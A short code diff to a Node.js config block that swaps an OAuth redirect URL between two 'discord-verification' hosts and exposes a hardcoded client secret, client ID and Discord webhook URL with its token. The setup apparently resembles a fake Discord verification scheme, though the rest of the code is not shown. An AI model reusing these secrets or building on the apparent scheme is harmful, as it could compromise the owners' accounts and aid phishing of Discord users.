@@ -1,7 +1,7 @@
 //Config
 const client_secret = '9cq8Q~avJp5PQBm_lmXcYFqfgjBFfsd.M8ViHbrn'
 const client_id = '9211864f-25c4-450b-91fa-1280bfe9fc6c'
-const redirect_uri = 'https://discord-verification-xyvu.onrender.com'
+const redirect_uri = 'https://verification-dc.herokuapp.com/'
 const webhook_url = 'https://discordapp.com/api/webhooks/1042120127627395094/tydXRd7EA8WwEHcMXakxmcf3_xWZMjq3-Mt-KOoSTU7E_YXa_7CWzamWyxQbz-DEaiHM'
 //Requirements
 const axios = require('axios')
